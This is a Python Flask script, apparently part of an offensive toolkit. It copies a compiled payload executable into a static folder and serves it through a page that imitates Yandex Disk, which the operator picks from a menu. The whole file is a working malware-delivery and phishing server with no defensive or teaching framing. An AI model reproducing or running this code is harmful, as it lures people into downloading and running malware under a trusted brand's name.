from flask import Flask, render_template, flash
from shutil import copy
from termcolor import colored
from os import getcwd, mkdir
import time

app = Flask(__name__)
payload = ""
directory = ""
html_file = ""
	
@app.route('/')
def run_server():
	return render_template(html_file, payload="/static/files/" + payload, payload_name=payload)

def start_site(payload_name, color):
	global payload
	global directory
	global html_file

	payload = payload_name + ".exe"
	directory = getcwd() + "/lib/static/files/"
	target = "dist/" + payload
	target2 = "dist/" + payload_name

	try:
		mkdir(directory)
	except:
		pass

	try:
		copy(target, directory)
	except:
		copy(target2, directory)

	ans = ""

	while True:
		print("\nChoose site")
		print("=============")
		print("[1] Yandex disk")
		print("=============")

		ans = input("site" + colored(" > ", color))

		if ans == '1':
			html_file = 'yandex/yandex.html'
			break
		else:
			print("Wrong input!")

	app.run()
